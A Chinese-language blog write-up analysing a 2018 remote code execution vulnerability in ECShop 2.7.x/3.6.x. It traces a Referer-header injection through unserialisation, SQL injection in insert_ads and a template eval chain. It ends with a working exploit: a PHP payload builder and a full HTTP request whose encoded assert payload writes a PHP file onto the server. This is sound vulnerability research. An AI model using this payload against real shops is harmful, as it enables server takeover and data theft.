---
title: ECShop前台RCE漏洞分析
tags:
  - SQL
  - RCE
date: 2018-09-10 13:11:58
toc: true
---

## 0x00前言
前几天出了个`ECShop<= 2.7.x/3.6.x`前台RCE，实训太无聊了来分析一波
<!-- more -->

## 0x01环境搭建
- [ECShop_V2.7.3](http://download.ecshop.com/2.7.3/ECShop_V2.7.3_UTF8_release1106.rar)
- nginx
- php

## 0x02漏洞原理
漏洞的触发点在/user.php:301，可以看到代码逻辑做了个判断，如果http头部的referer不包含`user.php`，就将referer赋值给`$back_act`  

![](/img/2018-ecshop-rce-1.png)  

接下来第325行以$back_act的值为参数，传入`assign`方法，该方法的作用是注册变量，将可控变量传递给模板对象，接着使用display方法就能将这个模板渲染出来，来看一下`display`方法的具体实现（/includes/cls_template.php:100)  

![](/img/2018-ecshop-rce-2.png)  

可以看到代码获取了$out，$out中有一部分代码就是前面assign注册的变量（这里的技术细节我就不讨论了，有兴趣的师傅可以研究研究），然后将$out依据`$_echash`分割并且对奇数块执行了insert_mod方法，`$_echash`是代码里写死的
```php
var $_echash        = '554fcae493e564ee0dc75bdf2ebf94ca';
```
所以这里的$val是可控的，继续往下跟`insert_mod`方法（/includes/cls_template.php:1155）  

![](/img/2018-ecshop-rce-3.png)  

该方法实现了一个动态函数调用，将传入的字符串分割后，前半部分拼接进函数名，后半部分反序列化为一个对象并传入该函数（这里因为参数可控，直接就能反序列化漏洞了，但是不知道为啥没有师傅提到，可能是被RCE掩盖了8），所以此处我们就能调用一个`insert_`开头的函数，这里通过网上流传的payload可以知道是调用了一个`insert_ads`方法（/includes/lib_insert.php:136）

![](/img/2018-ecshop-rce-4.png)  

代码将传入的对象取出num和id拼接进sql语句，因为对象是可控的，所以这里就存在了sql注入漏洞，结合前面的$out分割和分割取ads函数名和反序列化可以构造注入payload如下
```http
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:36:"*/ union select 1,2,3,4,5,6,7,8,9,10";s:2:"id";s:3:"'/*";}
```
拼接进去后的sql长这样
```sql
SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop273`.`ecs_ad` AS a LEFT JOIN `ecshop273`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time <= '1536544160' AND end_time >= '1536544160' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10
```
放到数据库里可以成功union select出数据  

![](/img/2018-ecshop-rce-5.png)  

这意味着查询出的结果也是我们可控的，继续啃代码，可以知道查询出来的position_id等于传入对象的id属性时，`$position_style`会被赋值为查询出的`position_style`并加入前缀`str:`接着传入fetch方法中
```php
foreach ($res AS $row)
    {
        if ($row['position_id'] != $arr['id'])
        {
            continue;
        }
        $position_style = $row['position_style'];
        .
        .
        .
 $val = $GLOBALS['smarty']->fetch($position_style);
```
跟进fetch方法，后面就是一条长长的利用链了：
- fetch（/includes/cls_template.php:135）：取str:后的字符串，`fetch_str`处理后传入_eval执行
- _eval（/includes/cls_template.php:1179）：将参数拼接进eval()执行
- fetch_str（/includes/cls_template.php:281）：过滤了一堆参数然后将`{}`内的字符串传入`select`中处理，返回处理后的字符串
- select（/includes/cls_template.php:371）：如果传入的参数以`$`开头，则将其传入`get_val`并将结果拼接到`<?php echo ' . $res . '; ?>`返回
- get_val（/includes/cls_template.php:553）：避开其他几个判断，直接将参数传入`make_val`执行并返回
- make_var（/includes/cls_template.php:663）：将字符串拼接进`$p = '$this->_var[\'' . $val . '\']';`并返回

根据以上利用链，最后构造的payload为`{$'];assert(xxxxxx);//}`
最后拼接进eval的参数长这样（其实上面利用链中还有其他许多分支可以最后拼接出可执行的代码，我就不深入研究了
```php
<?php echo $this->_var[''];assert(base64_decode("ZmlsZV9wdXRfY29udGVudHMoJy4vdGVtcC94aXNoaXIucGhwJywnPD9waHAgcGhwaW5mbygpOz8+Jyk="));//']; ?>
```

## 0x03漏洞利用
最后就是构造完整的payload了，我的构造脚本如下，扔到php里运行就好
```php
<?php

$payload = "file_put_contents('./temp/xishir.php','<?php phpinfo();?>')";
$res = "\{\$'];assert(base64_decode(\"".base64_encode($payload)."\"));//}";

bin2hex($res);
$a = ['num' => "*/ union select 1,0x272f2a,3,4,5,6,7,8,0x".bin2hex($res).",9", 'id' => "'/*"];

echo serialize($a);
```
```http
GET /ECShop_V2.7.3_UTF8_release1106/upload/user.php HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:273:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x5c7b24275d3b617373657274286261736536345f6465636f646528225a6d6c735a56397764585266593239756447567564484d6f4a793476644756746343393461584e6f61584975634768774a79776e5044397761484167634768776157356d627967704f7a382b4a796b3d2229293b2f2f7d,9";s:2:"id";s:3:"'/*";}
Connection: close

```
payload运行效果
![](/img/2018-ecshop-rce-5.gif)  

## 0x04参考链接
- [ECShop全系列版本远程代码执行高危漏洞分析](https://xz.aliyun.com/t/2689)
- [ECShop sqli and rce](www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/)

## 0x05后话
ECShop3.*中只是加了一些防护，核心漏洞点换汤不换药，有兴趣的师傅自行研究8  
ECShop4.0的修复方案是把插入sql的num和id强转为int，但是前面还有个动态函数调用和反序列化还是有风险的感觉，等一个师傅来解答。

有趣的是昨天分析下载代码的时候注册了一下ECShop官方的账号，今天就有小改改打电话问我是不是搞电商的，和她说我只是下载代码来学习研究的，她还推荐我去分析最新的4.*版本，好的我一定分析，咕咕咕
